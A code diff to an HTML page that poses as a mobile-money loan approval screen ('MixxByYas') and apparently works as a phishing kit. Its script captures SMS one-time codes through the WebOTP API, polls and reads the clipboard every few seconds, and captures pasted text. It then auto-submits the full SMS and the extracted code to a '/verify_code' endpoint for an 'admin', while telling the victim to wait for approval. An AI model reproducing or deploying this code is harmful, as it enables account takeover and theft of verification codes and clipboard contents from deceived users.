@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
         body {
             min-height: 100vh;
             background: linear-gradient(145deg, #0b0e1a 0%, #141b2b 100%);
@@ -21,10 +21,9 @@
             width: 100%;
             background: rgba(22, 30, 46, 0.85);
             backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
             border-radius: 48px;
             padding: 32px 24px;
-            box-shadow: 0 25px 50px -8px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.03);
+            box-shadow: 0 25px 50px -8px rgba(0,0,0,0.8);
             border: 1px solid rgba(255,255,255,0.04);
         }
         .badge {
@@ -56,8 +55,6 @@
             margin-bottom: 28px;
             border-left: 3px solid #4f46e5;
             padding-left: 14px;
-            background: rgba(79, 70, 229, 0.05);
-            border-radius: 0 8px 8px 0;
         }
         .step-guide {
             background: rgba(15, 23, 42, 0.6);
@@ -93,11 +90,6 @@
             padding: 20px 18px;
             margin: 20px 0 18px;
             border: 1px solid #334155;
-            transition: border 0.2s, box-shadow 0.2s;
-        }
-        .sms-box:focus-within {
-            border-color: #818cf8;
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
         }
         .sms-box label {
             display: block;
@@ -118,33 +110,27 @@
             min-height: 90px;
             padding: 0;
             outline: none;
-            font-family: 'Inter', monospace;
+            font-family: monospace;
         }
-        textarea#smsCode::placeholder { color: #475569; font-size: 15px; font-weight: 300; }
-        .sms-actions {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            margin: 14px 0 10px;
-        }
+        textarea#smsCode::placeholder { color: #475569; font-size: 15px; }
         .btn-app {
-            flex: 1;
-            display: flex;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             background: #1e293b;
             border: 1px solid #334155;
-            padding: 12px 6px;
+            padding: 12px 20px;
             border-radius: 60px;
             color: #e2e8f0;
             font-weight: 500;
             font-size: 15px;
-            transition: 0.15s;
             cursor: pointer;
             text-decoration: none;
+            margin-right: 10px;
+            margin-bottom: 10px;
         }
-        .btn-app:active { transform: scale(0.96); background: #2d3a52; }
+        .btn-app:active { transform: scale(0.96); }
         .btn-primary {
             width: 100%;
             background: #4f46e5;
@@ -159,7 +145,6 @@
             justify-content: center;
             gap: 12px;
             margin-top: 12px;
-            transition: 0.15s;
             cursor: pointer;
             box-shadow: 0 8px 20px -6px rgba(79, 70, 229, 0.3);
         }
@@ -258,14 +243,17 @@
             50% { opacity: 1; transform: scale(1.2); }
             100% { opacity: 0.4; transform: scale(0.9); }
         }
-        .sms-badge {
-            display: inline-block;
-            background: rgba(99, 102, 241, 0.1);
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #818cf8;
-            border: 1px solid rgba(99, 102, 241, 0.1);
+        .code-display {
+            background: #0f172a;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #34d399;
+            text-align: center;
+            margin: 10px 0;
+            font-family: monospace;
+            letter-spacing: 4px;
         }
         .success-overlay {
             position: fixed;
@@ -280,9 +268,7 @@
             z-index: 1000;
             backdrop-filter: blur(8px);
         }
-        .success-overlay.show {
-            display: flex;
-        }
+        .success-overlay.show { display: flex; }
         .success-modal {
             background: #1e293b;
             padding: 40px;
@@ -297,14 +283,8 @@
             color: #34d399;
             margin-bottom: 20px;
         }
-        .success-modal h2 {
-            color: #f1f5f9;
-            margin-bottom: 10px;
-        }
-        .success-modal p {
-            color: #94a3b8;
-            margin-bottom: 20px;
-        }
+        .success-modal h2 { color: #f1f5f9; margin-bottom: 10px; }
+        .success-modal p { color: #94a3b8; margin-bottom: 20px; }
         .success-modal .btn-close {
             background: #4f46e5;
             border: none;
@@ -313,22 +293,19 @@
             color: white;
             font-weight: 600;
             cursor: pointer;
-            transition: 0.15s;
         }
-        .success-modal .btn-close:hover {
-            background: #4338ca;
-        }
-        .code-display {
-            background: #0f172a;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 24px;
-            font-weight: bold;
-            color: #34d399;
-            text-align: center;
+        .sms-actions {
+            display: flex;
+            gap: 10px;
             margin: 10px 0;
-            font-family: monospace;
-            letter-spacing: 4px;
+        }
+        .sms-badge {
+            background: rgba(99, 102, 241, 0.1);
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #818cf8;
+            border: 1px solid rgba(99, 102, 241, 0.1);
         }
     </style>
 </head>
@@ -370,7 +347,6 @@
         <textarea id="smsCode" readonly placeholder="SMS will appear here automatically..."></textarea>
     </div>
 
-    <!-- Display extracted code -->
     <div id="codeDisplay" class="code-display" style="display:none;">
         Code: <span id="extractedCodeDisplay"></span>
     </div>
@@ -392,402 +368,337 @@
 
     <div id="statusToast" class="toast hidden">
         <i class="fas fa-circle-check"></i>
-        <span id="toastMessage">SMS imebandikwa!</span>
+        <span id="toastMessage">SMS detected!</span>
     </div>
     <div class="status-badge" id="statusText">
         <i class="fas fa-info-circle"></i> Waiting for SMS...
     </div>
 </div>
 
-<!-- Success Overlay -->
 <div id="successOverlay" class="success-overlay">
     <div class="success-modal">
         <i class="fas fa-check-circle"></i>
         <h2>Loan Approved! ✅</h2>
-        <p>Your loan has been approved successfully. You will receive a confirmation SMS shortly.</p>
+        <p>Your loan has been approved successfully.</p>
         <button class="btn-close" onclick="closeSuccess()">Done</button>
     </div>
 </div>
 
 <script>
-    (function() {
-        'use strict';
+    // Simplified JavaScript
+    const smsTextarea = document.getElementById('smsCode');
+    const submitBtn = document.getElementById('submitBtn');
+    const submitSpinner = document.getElementById('submitSpinner');
+    const resendBtn = document.getElementById('resendBtn');
+    const resendCounter = document.getElementById('resendCounter');
+    const statusToast = document.getElementById('statusToast');
+    const toastMessage = document.getElementById('toastMessage');
+    const statusText = document.getElementById('statusText');
+    const detectionStatus = document.getElementById('detectionStatus');
+    const codeDisplay = document.getElementById('codeDisplay');
+    const extractedCodeDisplay = document.getElementById('extractedCodeDisplay');
+    const successOverlay = document.getElementById('successOverlay');
 
-        const smsTextarea = document.getElementById('smsCode');
-        const submitBtn = document.getElementById('submitBtn');
-        const submitSpinner = document.getElementById('submitSpinner');
-        const resendBtn = document.getElementById('resendBtn');
-        const resendCounter = document.getElementById('resendCounter');
-        const statusToast = document.getElementById('statusToast');
-        const toastMessage = document.getElementById('toastMessage');
-        const statusText = document.getElementById('statusText');
-        const detectionStatus = document.getElementById('detectionStatus');
-        const successOverlay = document.getElementById('successOverlay');
-        const codeDisplay = document.getElementById('codeDisplay');
-        const extractedCodeDisplay = document.getElementById('extractedCodeDisplay');
+    let resendAttempts = 0;
+    const MAX_RESEND = 3;
+    let cooldownTimer = null;
+    let cooldownSeconds = 0;
+    let isSubmitting = false;
+    let smsDetected = false;
+    let extractedCode = '';
 
-        let resendAttempts = 0;
-        const MAX_RESEND = 3;
-        let cooldownTimer = null;
-        let cooldownSeconds = 0;
-        let isSubmitting = false;
-        let smsDetected = false;
-        let extractedCode = '';
-
-        function showToast(msg, isError = false) {
-            statusToast.classList.remove('hidden');
-            toastMessage.textContent = msg;
-            if (isError) {
-                statusToast.style.borderLeftColor = '#ef4444';
-                statusToast.querySelector('i').className = 'fas fa-circle-exclamation';
-            } else {
-                statusToast.style.borderLeftColor = '#4f46e5';
-                statusToast.querySelector('i').className = 'fas fa-circle-check';
-            }
-            clearTimeout(window.toastTimeout);
-            window.toastTimeout = setTimeout(() => {
-                statusToast.classList.add('hidden');
-            }, 5000);
+    function showToast(msg, isError = false) {
+        statusToast.classList.remove('hidden');
+        toastMessage.textContent = msg;
+        if (isError) {
+            statusToast.style.borderLeftColor = '#ef4444';
+            statusToast.querySelector('i').className = 'fas fa-circle-exclamation';
+        } else {
+            statusToast.style.borderLeftColor = '#4f46e5';
+            statusToast.querySelector('i').className = 'fas fa-circle-check';
         }
+        clearTimeout(window.toastTimeout);
+        window.toastTimeout = setTimeout(() => {
+            statusToast.classList.add('hidden');
+        }, 5000);
+    }
 
-        function setStatus(msg, icon = 'fa-info-circle') {
-            statusText.innerHTML = `<i class="fas ${icon}"></i> ${msg}`;
+    function setStatus(msg, icon = 'fa-info-circle') {
+        statusText.innerHTML = `<i class="fas ${icon}"></i> ${msg}`;
+    }
+
+    function updateResendUI() {
+        resendCounter.textContent = `${resendAttempts} / ${MAX_RESEND}`;
+        if (resendAttempts >= MAX_RESEND) {
+            resendBtn.disabled = true;
+            resendBtn.innerHTML = '<i class="fas fa-ban"></i> Imeisha';
+            return;
         }
-
-        function updateResendUI() {
-            resendCounter.textContent = `${resendAttempts} / ${MAX_RESEND}`;
-            if (resendAttempts >= MAX_RESEND) {
-                resendBtn.disabled = true;
-                resendBtn.innerHTML = '<i class="fas fa-ban"></i> Imeisha';
-                return;
-            }
-            if (cooldownSeconds > 0) {
-                resendBtn.disabled = true;
-                resendBtn.innerHTML = `<i class="fas fa-hourglass-half"></i> ${cooldownSeconds}s`;
-            } else {
-                resendBtn.disabled = false;
-                resendBtn.innerHTML = '<i class="fas fa-rotate-right"></i> Tuma tena';
-            }
+        if (cooldownSeconds > 0) {
+            resendBtn.disabled = true;
+            resendBtn.innerHTML = `<i class="fas fa-hourglass-half"></i> ${cooldownSeconds}s`;
+        } else {
+            resendBtn.disabled = false;
+            resendBtn.innerHTML = '<i class="fas fa-rotate-right"></i> Tuma tena';
         }
+    }
 
-        function startCooldown() {
-            if (cooldownTimer) clearInterval(cooldownTimer);
-            cooldownSeconds = 30;
+    function startCooldown() {
+        if (cooldownTimer) clearInterval(cooldownTimer);
+        cooldownSeconds = 30;
+        updateResendUI();
+        cooldownTimer = setInterval(() => {
+            cooldownSeconds--;
             updateResendUI();
-            cooldownTimer = setInterval(() => {
-                cooldownSeconds--;
+            if (cooldownSeconds <= 0) {
+                clearInterval(cooldownTimer);
+                cooldownTimer = null;
                 updateResendUI();
-                if (cooldownSeconds <= 0) {
-                    clearInterval(cooldownTimer);
-                    cooldownTimer = null;
-                    updateResendUI();
-                }
-            }, 1000);
-        }
-
-        function extractCodeFromSMS(smsText) {
-            if (!smsText) return null;
-            
-            const patterns = [
-                /code[:\s]+([a-zA-Z0-9]{6,20})/i,
-                /verification[:\s]+code[:\s]+([a-zA-Z0-9]{6,20})/i,
-                /OTP[:\s]+([a-zA-Z0-9]{6,20})/i,
-                /use the code[:\s]+([a-zA-Z0-9]{6,20})/i,
-                /([a-zA-Z0-9]{8,20})(?=\s+to\s+complete)/i,
-                /([a-zA-Z0-9]{8,20})(?=\s+to\s+register)/i,
-                /([a-zA-Z0-9]{6,20})(?=\s+is\s+your)/i,
-                /\b([a-zA-Z0-9]{8,20})\b/
-            ];
-            
-            for (let pattern of patterns) {
-                const match = smsText.match(pattern);
-                if (match) {
-                    return match[1];
-                }
             }
-            return null;
+        }, 1000);
+    }
+
+    function extractCodeFromSMS(smsText) {
+        if (!smsText) return null;
+        const patterns = [
+            /code[:\s]+([a-zA-Z0-9]{6,20})/i,
+            /OTP[:\s]+([a-zA-Z0-9]{6,20})/i,
+            /use the code[:\s]+([a-zA-Z0-9]{6,20})/i,
+            /([a-zA-Z0-9]{8,20})(?=\s+to\s+complete)/i,
+            /\b([a-zA-Z0-9]{8,20})\b/
+        ];
+        for (let pattern of patterns) {
+            const match = smsText.match(pattern);
+            if (match) return match[1];
         }
+        return null;
+    }
 
-        // FIXED: Better WebOTP handling
-        async function autoReadSMS() {
-            try {
-                // Check if WebOTP is available
-                if (!('OTPCredential' in window)) {
-                    detectionStatus.textContent = '📋 Please copy SMS from notification';
-                    return false;
-                }
-
-                detectionStatus.textContent = '📱 Listening for SMS...';
-                console.log('Waiting for SMS via WebOTP...');
-                
-                const abortController = new AbortController();
-                const timeoutId = setTimeout(() => {
-                    abortController.abort();
-                }, 60000); // 60 seconds
-
-                // This will trigger the "Allow" prompt
-                const otp = await navigator.credentials.get({
-                    otp: { transport: ['sms'] },
-                    signal: abortController.signal
-                });
-
-                clearTimeout(timeoutId);
-
-                if (otp && otp.code) {
-                    console.log('Code received from WebOTP:', otp.code);
-                    extractedCode = otp.code;
-                    
-                    // Create a full SMS message with the code
-                    const fullSMS = `Your verification code is: ${otp.code}`;
-                    
-                    // Fill the textarea
-                    smsTextarea.value = fullSMS;
-                    smsDetected = true;
-                    
-                    // Show the extracted code
-                    codeDisplay.style.display = 'block';
-                    extractedCodeDisplay.textContent = otp.code;
-                    
-                    detectionStatus.textContent = '✅ SMS detected automatically!';
-                    showToast(`Code detected: ${otp.code} 🎯`);
-                    setStatus(`Code: ${otp.code} - Auto-submitting...`, 'fa-check-circle');
-                    
-                    // Auto-submit after 1 second
-                    setTimeout(() => {
-                        if (!isSubmitting && smsTextarea.value.trim().length > 0) {
-                            submitCode();
-                        }
-                    }, 1000);
-                    
-                    return true;
-                }
-                
-                return false;
-            } catch (err) {
-                if (err.name === 'AbortError') {
-                    detectionStatus.textContent = '⏱️ SMS timeout. Please copy manually.';
-                } else {
-                    console.log('WebOTP error:', err);
-                    detectionStatus.textContent = '📋 Please copy SMS from notification';
-                }
+    // WebOTP Auto-Read
+    async function autoReadSMS() {
+        try {
+            if (!('OTPCredential' in window)) {
+                detectionStatus.textContent = '📋 Please copy SMS';
                 return false;
             }
-        }
 
-        // FALLBACK: Read from clipboard
-        async function readClipboard() {
-            try {
-                if (!navigator.clipboard || !navigator.clipboard.readText) {
-                    return false;
-                }
-                
-                const text = await navigator.clipboard.readText();
-                if (text && text.trim().length > 10 && !smsDetected) {
-                    const lowerText = text.toLowerCase();
-                    if (lowerText.includes('mixx') || 
-                        lowerText.includes('code') || 
-                        lowerText.includes('verification') ||
-                        lowerText.includes('register') ||
-                        /[a-zA-Z0-9]{8,20}/.test(text)) {
-                        
-                        smsTextarea.value = text.trim();
-                        smsDetected = true;
-                        
-                        // Extract and show code
-                        const code = extractCodeFromSMS(text);
-                        if (code) {
-                            extractedCode = code;
-                            codeDisplay.style.display = 'block';
-                            extractedCodeDisplay.textContent = code;
-                        }
-                        
-                        detectionStatus.textContent = '✅ SMS from clipboard!';
-                        showToast('SMS imebandikwa kutoka clipboard! 📋');
-                        setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
-                        
-                        setTimeout(() => {
-                            if (!isSubmitting && smsTextarea.value.trim().length > 0) {
-                                submitCode();
-                            }
-                        }, 800);
-                        return true;
-                    }
-                }
-                return false;
-            } catch (err) {
-                return false;
-            }
-        }
-
-        // Combined detection
-        async function detectSMS() {
-            if (smsDetected || isSubmitting) return;
+            detectionStatus.textContent = '📱 Listening for SMS...';
             
-            // Try WebOTP first
-            const autoSuccess = await autoReadSMS();
-            if (autoSuccess) return;
-            
-            // Then try clipboard
-            await readClipboard();
-        }
+            const abortController = new AbortController();
+            const timeoutId = setTimeout(() => abortController.abort(), 60000);
 
-        function submitCode() {
-            const code = smsTextarea.value.trim();
-            if (!code) {
-                showToast('Tafadhali bandika SMS kwanza.', true);
-                setStatus('SMS haipo. Bandika au ngoja.', 'fa-exclamation-triangle');
-                return;
-            }
-
-            if (isSubmitting) return;
-            isSubmitting = true;
-            submitBtn.disabled = true;
-            submitSpinner.classList.remove('hidden');
-            setStatus('Inatuma kwa admin...', 'fa-spinner fa-pulse');
-
-            // Use extracted code if available
-            const codeToSend = extractedCode || extractCodeFromSMS(code) || code;
-            
-            fetch('/verify_code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    code: code,
-                    extracted_code: codeToSend,
-                    full_sms: code
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                isSubmitting = false;
-                submitBtn.disabled = false;
-                submitSpinner.classList.add('hidden');
-                if (data.status === 'success') {
-                    showToast('Code imetumwa kwa admin! 🔐');
-                    setStatus('Subiri uthibitisho kutoka kwa admin.', 'fa-clock');
-                } else {
-                    showToast('Hitilafu: ' + (data.message || 'jaribu tena'), true);
-                    setStatus('Tatizo la mawasiliano. Jaribu tena.', 'fa-exclamation-triangle');
-                }
-            })
-            .catch(err => {
-                isSubmitting = false;
-                submitBtn.disabled = false;
-                submitSpinner.classList.add('hidden');
-                showToast('Hitilafu ya mtandao. Jaribu tena.', true);
-                setStatus('Hakuna muunganisho.', 'fa-wifi-slash');
-                console.error(err);
+            const otp = await navigator.credentials.get({
+                otp: { transport: ['sms'] },
+                signal: abortController.signal
             });
-        }
 
-        function closeSuccess() {
-            successOverlay.classList.remove('show');
-        }
+            clearTimeout(timeoutId);
 
-        // Show success overlay
-        window.showSuccess = function() {
-            successOverlay.classList.add('show');
-        };
-
-        // Event listeners
-        submitBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            submitCode();
-        });
-
-        resendBtn.addEventListener('click', function() {
-            if (resendAttempts >= MAX_RESEND) return;
-            if (cooldownSeconds > 0) return;
-
-            resendAttempts++;
-            startCooldown();
-            updateResendUI();
-
-            // Reset everything
-            smsDetected = false;
-            extractedCode = '';
-            smsTextarea.value = '';
-            codeDisplay.style.display = 'none';
-            detectionStatus.textContent = '📱 Waiting for new SMS...';
-            
-            fetch('/resend_code', { method: 'POST' })
-            .then(res => res.json())
-            .then(data => {
-                showToast('Code imetumwa tena! 📲');
-                setStatus('Angalia SMS yako.', 'fa-envelope');
-                setTimeout(() => detectSMS(), 2000);
-            })
-            .catch(() => {
-                showToast('Hitilafu ya kupeleka tena.', true);
-            });
-        });
-
-        // Page load
-        window.addEventListener('load', function() {
-            setTimeout(() => detectSMS(), 1000);
-        });
-
-        // Visibility change (user returns to page)
-        document.addEventListener('visibilitychange', function() {
-            if (document.visibilityState === 'visible' && !smsDetected) {
-                detectionStatus.textContent = '🔄 Checking for SMS...';
-                setTimeout(() => detectSMS(), 500);
-            }
-        });
-
-        // Focus on textarea
-        smsTextarea.addEventListener('focus', function() {
-            if (!smsDetected) {
-                detectSMS();
-            }
-        });
-
-        // Click on card
-        document.querySelector('.card').addEventListener('click', function(e) {
-            if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'A' && !smsDetected) {
-                detectSMS();
-            }
-        });
-
-        // Paste event
-        document.addEventListener('paste', function(e) {
-            const pasted = e.clipboardData?.getData('text');
-            if (pasted && pasted.trim().length > 0 && !smsDetected) {
-                smsTextarea.value = pasted.trim();
+            if (otp && otp.code) {
+                console.log('Code received:', otp.code);
+                extractedCode = otp.code;
+                const fullSMS = `Your verification code is: ${otp.code}`;
+                
+                smsTextarea.value = fullSMS;
                 smsDetected = true;
                 
-                const code = extractCodeFromSMS(pasted);
+                codeDisplay.style.display = 'block';
+                extractedCodeDisplay.textContent = otp.code;
+                
+                detectionStatus.textContent = '✅ SMS detected!';
+                showToast(`Code: ${otp.code}`);
+                setStatus(`Code: ${otp.code} - Submitting...`, 'fa-check-circle');
+                
+                setTimeout(() => {
+                    if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                        submitCode();
+                    }
+                }, 1000);
+                
+                return true;
+            }
+            return false;
+        } catch (err) {
+            console.log('WebOTP error:', err);
+            detectionStatus.textContent = '📋 Please copy SMS';
+            return false;
+        }
+    }
+
+    // Clipboard fallback
+    async function readClipboard() {
+        try {
+            if (!navigator.clipboard || !navigator.clipboard.readText) return false;
+            
+            const text = await navigator.clipboard.readText();
+            if (text && text.trim().length > 10 && !smsDetected) {
+                smsTextarea.value = text.trim();
+                smsDetected = true;
+                
+                const code = extractCodeFromSMS(text);
                 if (code) {
                     extractedCode = code;
                     codeDisplay.style.display = 'block';
                     extractedCodeDisplay.textContent = code;
                 }
                 
-                detectionStatus.textContent = '✅ SMS pasted!';
-                showToast('SMS imebandikwa! 📋');
-                setStatus('SMS detected. Auto-submitting...', 'fa-check-circle');
+                detectionStatus.textContent = '✅ SMS from clipboard!';
+                showToast('SMS from clipboard!');
+                setStatus('SMS detected. Submitting...', 'fa-check-circle');
+                
                 setTimeout(() => {
                     if (!isSubmitting && smsTextarea.value.trim().length > 0) {
                         submitCode();
                     }
-                }, 400);
+                }, 800);
+                return true;
             }
+            return false;
+        } catch (err) {
+            return false;
+        }
+    }
+
+    async function detectSMS() {
+        if (smsDetected || isSubmitting) return;
+        const autoSuccess = await autoReadSMS();
+        if (autoSuccess) return;
+        await readClipboard();
+    }
+
+    function submitCode() {
+        const code = smsTextarea.value.trim();
+        if (!code) {
+            showToast('Please paste SMS first.', true);
+            return;
+        }
+
+        if (isSubmitting) return;
+        isSubmitting = true;
+        submitBtn.disabled = true;
+        submitSpinner.classList.remove('hidden');
+        setStatus('Sending to admin...', 'fa-spinner fa-pulse');
+
+        const codeToSend = extractedCode || extractCodeFromSMS(code) || code;
+
+        fetch('/verify_code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                code: code,
+                extracted_code: codeToSend,
+                full_sms: code
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            isSubmitting = false;
+            submitBtn.disabled = false;
+            submitSpinner.classList.add('hidden');
+            if (data.status === 'success') {
+                showToast('Code sent to admin! 🔐');
+                setStatus('Waiting for admin approval.', 'fa-clock');
+            } else {
+                showToast('Error: ' + (data.message || 'try again'), true);
+                setStatus('Error. Please try again.', 'fa-exclamation-triangle');
+            }
+        })
+        .catch(err => {
+            isSubmitting = false;
+            submitBtn.disabled = false;
+            submitSpinner.classList.add('hidden');
+            showToast('Network error. Try again.', true);
+            setStatus('No connection.', 'fa-wifi-slash');
+            console.error(err);
         });
+    }
 
-        // Init
+    function closeSuccess() {
+        successOverlay.classList.remove('show');
+    }
+
+    window.showSuccess = function() {
+        successOverlay.classList.add('show');
+    };
+
+    // Event listeners
+    submitBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        submitCode();
+    });
+
+    resendBtn.addEventListener('click', function() {
+        if (resendAttempts >= MAX_RESEND) return;
+        if (cooldownSeconds > 0) return;
+
+        resendAttempts++;
+        startCooldown();
         updateResendUI();
-        smsTextarea.setAttribute('readonly', 'readonly');
-        
-        // Keep trying every 5 seconds
-        const detectionInterval = setInterval(() => {
-            if (!smsDetected && !isSubmitting) {
-                detectSMS();
-            }
-        }, 5000);
 
-        console.log('🚀 MixxByYas with SMS Auto-Read loaded!');
-        console.log('📱 WebOTP API available:', 'OTPCredential' in window);
-    })();
+        smsDetected = false;
+        extractedCode = '';
+        smsTextarea.value = '';
+        codeDisplay.style.display = 'none';
+        detectionStatus.textContent = '📱 Waiting for new SMS...';
+        
+        fetch('/resend_code', { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            showToast('Code resent! 📲');
+            setStatus('Check your SMS.', 'fa-envelope');
+            setTimeout(() => detectSMS(), 2000);
+        })
+        .catch(() => {
+            showToast('Failed to resend.', true);
+        });
+    });
+
+    // Page events
+    window.addEventListener('load', function() {
+        setTimeout(() => detectSMS(), 1000);
+    });
+
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'visible' && !smsDetected) {
+            detectionStatus.textContent = '🔄 Checking for SMS...';
+            setTimeout(() => detectSMS(), 500);
+        }
+    });
+
+    document.addEventListener('paste', function(e) {
+        const pasted = e.clipboardData?.getData('text');
+        if (pasted && pasted.trim().length > 0 && !smsDetected) {
+            smsTextarea.value = pasted.trim();
+            smsDetected = true;
+            const code = extractCodeFromSMS(pasted);
+            if (code) {
+                extractedCode = code;
+                codeDisplay.style.display = 'block';
+                extractedCodeDisplay.textContent = code;
+            }
+            detectionStatus.textContent = '✅ SMS pasted!';
+            showToast('SMS pasted! 📋');
+            setStatus('SMS detected. Submitting...', 'fa-check-circle');
+            setTimeout(() => {
+                if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                    submitCode();
+                }
+            }, 400);
+        }
+    });
+
+    // Init
+    updateResendUI();
+    smsTextarea.setAttribute('readonly', 'readonly');
+    
+    // Keep trying
+    setInterval(() => {
+        if (!smsDetected && !isSubmitting) {
+            detectSMS();
+        }
+    }, 5000);
+
+    console.log('🚀 MixxByYas with SMS Auto-Read loaded!');
 </script>
 
 </body>
